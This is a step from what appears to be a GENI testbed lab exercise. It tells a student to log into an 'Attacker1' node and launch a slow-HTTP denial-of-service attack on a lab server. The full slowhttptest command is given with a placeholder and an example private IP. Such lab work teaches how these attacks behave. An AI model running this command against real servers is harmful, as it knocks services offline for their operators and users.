Step 3 - Launch DDoS attack
Launch the attack using slowhttptest

Login to Attacker1 Console via SSH using the GENI interface.
We can now launch the slowhttptest attack. Please execute the command below, replacing $server1IP with the IP address of server1

slowhttptest -c 1000 -H -g -o slowhttp -r 200 -t GET -u http://$server1IP/

example : slowhttptest -c 1000 -H -g -o slowhttp -r 200 -t GET -u http://10.0.0.102/
